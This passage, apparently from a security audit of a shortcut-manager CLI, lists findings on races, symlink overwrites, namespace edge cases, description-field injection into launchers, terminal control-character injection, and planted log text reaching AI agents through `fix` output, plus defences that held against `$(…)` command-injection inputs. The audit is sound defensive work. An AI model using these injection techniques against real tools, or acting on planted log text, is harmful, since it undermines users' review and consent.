- **Lost updates on shared imports.** `registry_lock` locks the store, but `"imports"` lets two stores share a file. Thirty parallel `new --group x` from two projects kept 27 to 29 entries across five rounds. Fix: lock `group.file + ".lock"` rather than the store.
- **Symlinked registries get replaced.** `os.replace` swaps a symlinked `shortcuts.json`, as used by stow or chezmoi, for a regular file, so the dotfile copy silently stops getting updates. Mode also narrows from 0644 to 0600, from `NamedTemporaryFile`. Fix: write to `realpath(path)` and copy the old mode.
- **`add --local` writes through a project's symlinked `scripts/`.** With `scripts -> ~/.local/bin`, the file lands there. It needs you to run `add` in a hostile checkout, and a name of its choosing can't be forced. Fix: refuse a `scripts_dir` that resolves outside the store.

```bash
mkdir dot; echo '{"version":2,"shortcuts":{}}' > dot/s.json
rm "$SHORTCUTS_HOME/shortcuts.json"; ln -s "$PWD/dot/s.json" "$SHORTCUTS_HOME/shortcuts.json"
shortcut new a --desc d -- true >/dev/null
stat -c 'store: %a %F' "$SHORTCUTS_HOME/shortcuts.json"
grep -c '"a"' dot/s.json
# expect: store: 600 regular file
```

### 18. Data model edge cases

Namespaces being one level deep held up as a model. I found nothing that needs nesting, and refusing `imports` inside a `.shortcut` closes a class of chained-trust problems. The name-collision rule is also sound. What's left is small:

- **`.shortcut` needs `version` to equal exactly 2** (`shortcut.py:338`), and `migrate` never touches namespaces. With `REGISTRY_VERSION` patched to 3, `migrate` said "Nothing to migrate" and the namespace was refused with `needs "version": 3`. Every `.shortcut` in the wild will strand on the next bump. Fix: accept `version <= current` and have `migrate` walk namespaces.
- **`init --global` silently drops a collection's namespaces**, both `imports/` and `"imports"`, with no line in `Skipped`. Fix: #6, or report them.
- **A store with `imports/` but no `shortcuts.json` is invisible.** `find_local_store_dir` tests only for `shortcuts.json`, so "put it in the store's `imports/` folder" fails with `no namespace named 'n' here` in a new project.
- **One stray file blocks a whole store.** Dropping `ls.shortcut` into global `imports/` beside a shortcut `ls` makes every global shortcut refuse to run. That's the documented rule, but the blast radius is large for one file. Blocking only the colliding name is enough.
- **A nested store replaces its parent completely.** `cd vendor/lib` with its own `.shortcuts/` makes the outer project's names disappear with `not found`, and that message doesn't mention the outer store.
- **Two argument names can collapse into one variable.** `a-b` and `a_b` both become `SC_ARG_A_B`. Fix: reject it in `validate_args`.

### 19. The core and bundled split leaks

The split is mostly sound. `log` and `nano` are honest one-liners over core commands. `desktop` is where it leaks:

- `desktop.sh` parses the human text of `shortcut show`. A description containing a newline and `Description: Hidden=true` adds that line to the launcher. Fix: `show --json`, or fields from `location`.
- The core still knows about launchers: `cmd_rm` deletes `shortcut-<name>.desktop` (`:1364-1372`), the `icon` field exists only for `desktop`, and `migrate` has launcher notes. If `desktop` is bundled, cleanup should be too, or it should stay in core.
- `desktop` works for global shortcuts only, and `desktop n a` fails with a usage error for namespace members.
- **uv and pipx users can't reach the templates.** `shortcut init --global <the repo URL>` fails with `No shortcuts.json found`, because the file is in `templates/`. `log` and `desktop`, which were commands in 1.x, need a clone. Fix: check `templates/` as a third location, or put a `shortcuts.json` at the repo root.

The bigger simplification isn't in the bundled set. **Two ways to declare a namespace is one too many.** The `"imports"` map is behind most of #8, the shared-file part of #17, and the "imported twice" rule. Using only `imports/` (a symlink covers the outside-file case, and it's visible) would remove a code path and a set of questions. `SHORTCUT_EDITOR_CMD`, a test hook that also changes production behaviour in `cmd_new`, could become a test fixture.

### 20. Small items

| Item | What happens | Fix |
|---|---|---|
| `/dev/zero` as a script | Before approval this is refused and holds. After one approval, a pulled `"script": "/dev/zero"` makes `list` and Tab completion allocate until `MemoryError`, because `group_files` has no `isfile` check (`:438`) | Check `isfile` and a size cap in `group_files` |
| stderr merged into stdout | Logged runs use `stderr=subprocess.STDOUT` (`:711`), so `shortcut r gen > out.json` gets warnings in the JSON | Use a second pipe, or document it; `log: false` works around it |
| One log per shortcut | Concurrent runs share `<name>.log`, overwrite each other, and lose a header. `fix` can then describe the wrong run | Open with `O_APPEND`, or use one file per run with a `latest` link |
| Approvals are never collected | Snapshots stay after `rm` and after a project is deleted, and they hold full script text, including any secret in it | Prune records whose key no longer exists, in `update` |
| Log modes | Logs are mode 0644, and `args:` in the header records `--token=…` in plain text | Create as 0600 |

---

## Suspected, not proved

- **C1 and other controls in the diff.** `show_diff` filters only ESC, CR and BS. U+009B and U+009D, BEL, SO, VT and bidi overrides all reach stdout from a script body; that part I proved by counting bytes. tmux printed U+009B as nothing and did not act on it. Other terminals may honour 8-bit CSI, but none was available to test. The `safe()` in #2 should cover them regardless.
- **Terminal reply injection.** Old terminals answer some queries by typing into the input stream. Combined with #2, that could put keystrokes at the `approve?` prompt. It depends on the terminal, and I didn't test it.
- **Agents obeying planted text.** #11 proves the text reaches `fix` output. Whether a given agent acts on it isn't something this tool determines.
- **Long diffs.** Paging happens only if `$PAGER` is set (`:1428-1429`), which it often isn't. A long diff then scrolls past and leaves the prompt under its last lines. It's a review-fatigue risk, not a bypass.
- **Crash durability.** `write_json_atomic` fsyncs the file but not the directory, so a power loss could lose a just-renamed registry. A SIGKILL mid-write leaves a `tmp*` file in `.shortcuts/`, which isn't in `.gitignore`. Neither was tested with real crashes.
- **Approval format changes.** Records have no version field, so any change to `group_files` silently invalidates every approval. That's fail-closed, but all at once.
- **`flock` on network filesystems.** Assumed to work on Linux NFS; not tested.

## What held up

These were attacked and survived.

- **The hash.** JSON is normalised, then hashed with an unambiguous encoding. Reformatting and key reordering don't invalidate it. Changing `cwd`, `description` or `inline`, or adding `log: false`, was refused each time. Duplicate keys can't fool `update`: it shows the parsed value, which is the one that runs. `ensure_ascii` means escapes and homoglyphs in the JSON show as `\u001b`, so the diff of a definition can't attack the terminal.
- **Prompt-time swaps during `update`.** The hash saved is of what was shown. A file changed while `approve?` is up gets refused as `changed`.
- **JSON and inline TOCTOU.** `run_shortcut` hashes and runs the same parsed object, so the window in #10 is limited to script files.
- **Nothing executes before approval.** `list`, `show`, `fix`, `update`, `location` and completion ran against entries with `$(…)` in their description, `cwd`, `icon` and name, and nothing ran. The only `compgen -W` expansion I could trigger needs a hostile name hand-written into your own global store; project names and collection names are validated first.
- **Relative `script` paths.** `../` and a symlink out of the project are both refused, because the check runs on the resolved path.
- **`init --global` file handling.** Symlinks, traversal, relative `cwd` and invalid names were all skipped and reported. The problem in #6 is that entries are trusted, not how they're copied.
- **`rm`.** It won't unlink anything outside the group's scripts folder.
- **No fallback.** An unapproved project shortcut refuses rather than quietly running your global one of the same name.
- **`.git` hooks.** They don't travel by clone or pull. A hook planted upstream was absent downstream and didn't fire. The real exposure is #4.
- **Approval records.** A corrupt or malformed record fails closed. Records live outside what they approve, one file per group, so there's no shared read-modify-write, and they're written 0600.
- **Locking on one store.** Thirty parallel `new` calls kept 30 of 30 entries and left no temp files. The lock isn't held across the editor or `git clone`, and `flock` releases on process death.
- **Unreadable scripts.** A mode-0111 binary gets skipped by the hash, which looks like a bypass, but `run` can't read its header and falls through to `bash`, which fails. It can't run while it's unhashed.
- **Filename as namespace name.** A downloaded file can't choose its own name from inside.

## The three changes I'd make first

1. **Move project logs into the global store.** It's a few lines, it removes the only Critical that needs no terminal trick (#1), and it closes the secret read and forged logs in #11 and the read-only failure in #12. A hostile repo should have no path that `shortcut` writes to.
2. **Sanitise every piece of file-derived text at the output boundary, and show non-UTF-8 scripts as text.** One `safe()` used by `die`, `print` and `show_diff`, plus `backslashreplace` for display, closes #2 and #3 and the `show` half of #6. After this, what's on the screen when you answer `approve?` is true, and that's the assumption the whole design rests on.
3. **Send everything through the one gate, and describe the gate honestly.** `init --global` writes a gated namespace (#6). Namespace keys include the store and name (#8). The resolved `cwd` joins the hash (#5). The approval record gets `via` and a timestamp (#7), and `ok` becomes `definitions unchanged` (#4). The README then says plainly that approval records consent to these definitions, doesn't cover what they call, and doesn't stop anything running as you, agents included.
